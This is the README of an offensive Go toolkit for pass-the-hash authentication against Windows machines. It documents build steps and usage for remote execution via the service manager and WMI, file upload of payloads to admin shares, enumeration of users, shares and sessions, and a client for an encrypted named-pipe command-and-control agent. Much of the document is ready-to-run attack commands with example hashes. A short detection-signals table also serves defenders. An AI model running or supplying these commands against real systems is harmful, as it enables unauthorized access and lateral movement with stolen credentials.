# go-thehash

Pass-the-Hash SMB/WMI toolkit written in Go. Modelled after [Invoke-TheHash](../Invoke-TheHash) but compiled to a single static Windows binary with no PowerShell or Windows SSPI dependency.

Authenticates via NTLMv2 using a raw NT hash — no plaintext password, no Windows credential store, no Kerberos.

**ATT&CK:** T1550.002 · T1021.002 · T1569.002 · T1047 · T1135 · T1049 · T1087.001 · T1083

---

## Build

**PowerShell (Windows):**

```powershell
go mod tidy
$env:GOOS = "windows"; $env:GOARCH = "amd64"; go build -ldflags="-s -w" -o go-thehash.exe .
```

**Bash (Linux / macOS / WSL):**

```bash
go mod tidy
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o go-thehash.exe .
```

> `go-smb` is vendored locally under `./go-smb` — the build is fully offline.

---

## Subcommands

### File transfer

```
go-thehash put  <target> <domain> <user> <nt-hash> <share> <remote-path> <local-path>
go-thehash get  <target> <domain> <user> <nt-hash> <share> <remote-path> <local-path>
go-thehash del  <target> <domain> <user> <nt-hash> <share> <remote-path>
go-thehash ls   <target> <domain> <user> <nt-hash> <share> <remote-dir> [pattern]
```

### Remote execution

```
go-thehash exec     <target> <domain> <user> <nt-hash> <command>
go-thehash exec-wmi <target> <domain> <user> <nt-hash> <command>
```

| | `exec` (MS-SCMR) | `exec-wmi` (DCOM/WMI) |
|---|---|---|
| Transport | SMB2 `IPC$\svcctl` named pipe | TCP port 135 + dynamic RPC port |
| Artefact | Event ID 7045 (SCM service install) | Event ID 4688 (process create via WMI) |
| Timing | 30 s SCM timeout expected — command still runs | Returns immediately |
| Requires | Port 445 | Port 135 + dynamic RPC range open |

> **`exec` note:** `command` must be an absolute binary path, or wrap shell built-ins explicitly:
> `"%COMSPEC% /c whoami > C:\Windows\Temp\out.txt"` — double-escape `%` when calling from a shell prompt.

### Enumeration

```
go-thehash enum shares   <target> <domain> <user> <nt-hash>
go-thehash enum sessions <target> <domain> <user> <nt-hash>
go-thehash enum users    <target> <domain> <user> <nt-hash> [netbios-name]
```

### Named-pipe command execution

```
go-thehash pipe <target> <domain> <user> <nt-hash> <pipe-name> <command>
```

Operator-side client for `smbpipe-agent.exe` ([`../smbpipe-agent/`](../smbpipe-agent/)): opens the remote named pipe over `IPC$`, performs the encrypted-channel handshake (16-byte salt → static X25519 ECDH + HKDF-SHA256 → per-connection AES-256-GCM keys), sends one command, prints the framed output. Retries up to 2 s when the server reports `STATUS_PIPE_BUSY`. The agent must already be listening on the target.

| | notes |
|---|---|
| Transport | SMB2 `IPC$` named pipe (tcp/445) — rides inside an ordinary SMB session |
| Artefact | No service install, no new process creation primitive beyond what the command itself runs |
| Requires | Port 445; local admin on target (agent DACL allows BA/SY only) |

Implementation notes:
- Byte-mode pipe with length-prefix framing, not `FSCTL_PIPE_TRANSCEIVE` — that IOCTL requires a message-mode server pipe, and separate `WriteFile` + `ReadFile` is correct against the byte-mode agent.
- SMB2 `ReadFile` on a named pipe ignores the offset parameter (data comes from the pipe buffer sequentially); passing `0` is correct.

---

## Arguments

| Argument | Description |
|---|---|
| `target` | IP address or hostname of the remote Windows machine |
| `domain` | Windows domain name; use `.` for local accounts |
| `user` | Username (e.g. `Administrator`) |
| `nt-hash` | 32-character hex NT hash, no `0x` prefix |
| `share` | SMB share name for file ops (e.g. `ADMIN$`, `C$`) |
| `remote-path` | Path inside the share (e.g. `Temp\payload.exe`) |
| `remote-dir` | Directory inside the share to list |
| `pattern` | File glob for `ls` — defaults to `*` |
| `local-path` | Local file path for `put` / `get` |
| `command` | Full command string for `exec` / `exec-wmi` |
| `pipe-name` | Named pipe name without the `\\.\pipe\` prefix (e.g. `oraclexa`) — must match the agent's pipe |
| `netbios-name` | NetBIOS computer name for `enum users`; auto-detected if omitted |

---

## Examples

```text
# Upload a file to the remote host
go-thehash.exe put  TARGET . Administrator aad3b435b51404eeaad3b435b51404ee ADMIN$ Temp\payload.exe .\payload.exe

# Download a file from the remote host
go-thehash.exe get  TARGET . Administrator aad3b435b51404eeaad3b435b51404ee C$ Windows\Temp\out.txt .\out.txt

# Delete a remote file
go-thehash.exe del  TARGET . Administrator aad3b435b51404eeaad3b435b51404ee C$ Windows\Temp\out.txt

# List a remote directory
go-thehash.exe ls   TARGET . Administrator aad3b435b51404eeaad3b435b51404ee C$ Windows\Temp *.exe

# Execute a command via Windows Service Manager (leaves Event ID 7045)
go-thehash.exe exec TARGET . Administrator aad3b435b51404eeaad3b435b51404ee "%COMSPEC% /c whoami > C:\Windows\Temp\out.txt"

# Execute a command via WMI (no service artefact)
go-thehash.exe exec-wmi TARGET . Administrator aad3b435b51404eeaad3b435b51404ee "cmd.exe /c whoami > C:\Windows\Temp\out.txt"

# Execute a command through the encrypted pipe channel (smbpipe-agent must be listening on TARGET)
go-thehash.exe pipe TARGET . Administrator aad3b435b51404eeaad3b435b51404ee oraclexa "whoami"

# Enumerate shares
go-thehash.exe enum shares   TARGET DOMAIN Administrator aad3b435b51404eeaad3b435b51404ee

# Enumerate active SMB sessions
go-thehash.exe enum sessions TARGET DOMAIN Administrator aad3b435b51404eeaad3b435b51404ee

# Enumerate local users (NetBIOS name auto-detected)
go-thehash.exe enum users    TARGET DOMAIN Administrator aad3b435b51404eeaad3b435b51404ee
```

---

## Detection signals

| Event | Notes |
|---|---|
| Event ID 4624 (Logon Type 3, NTLM) | Generated on target for every authenticated connection |
| Event ID 7045 (Service install) | `exec` only — random 12-char service name, deleted immediately after launch |
| SMB2 `TreeConnect` to admin share | Visible in network capture for file transfer subcommands |
| SMB2 `IPC$\svcctl` DCE/RPC | Visible in network capture for `exec` |
| SMB2 pipe open + read/write on custom pipe name | `pipe` subcommand — traffic is encrypted after handshake; only the salt and frame lengths are visible on the wire |

---

## Source layout

```
go-thehash/
├── main.go                    ← CLI dispatch only (usage + switch)
├── internal/
│   ├── session/               ← PtH SMB2 session setup (NTLMv2)
│   ├── fileops/               ← put / get / del / ls
│   ├── remoteexec/            ← exec (MS-SCMR) / exec-wmi (DCOM)
│   ├── pipechan/              ← pipe subcommand: encrypted channel client (mirror of smbpipe-agent internal/securechan)
│   └── enum/                  ← enum shares / sessions / users (MS-SRVS, MS-SAMR)
├── go.mod                     ← module declaration, go 1.24, replace → ./go-smb
├── go.sum
└── go-smb/                    ← jfjallid/go-smb vendored locally
```

> `internal/pipechan` duplicates the wire protocol implemented in `../smbpipe-agent/internal/securechan/`. A frame-layout change must be applied to both modules in the same change — see the "Mirror drift" section of the agent README for the incident that motivates this rule.

---

## Comparison with Invoke-TheHash

| Function | Invoke-TheHash | go-thehash |
|---|---|---|
| SMB execution (SCM) | `Invoke-SMBExec` | `exec` |
| WMI execution | `Invoke-WMIExec` | `exec-wmi` |
| File upload | `Invoke-SMBClient -Action Put` | `put` |
| File download | `Invoke-SMBClient -Action Get` | `get` |
| File delete | `Invoke-SMBClient -Action Delete` | `del` |
| Directory listing | `Invoke-SMBClient -Action List` | `ls` |
| Share enumeration | `Invoke-SMBEnum -Action Share` | `enum shares` |
| Session enumeration | `Invoke-SMBEnum -Action NetSession` | `enum sessions` |
| User enumeration | `Invoke-SMBEnum -Action User` | `enum users` |
| Named-pipe C2 client | — (no counterpart) | `pipe` |
| SMB versions | SMB1 + SMB2.1 | SMB2 only |
| Hash input format | `LM:NTLM` or `NTLM` (32/65 chars) | NT hash, 32-char hex only |
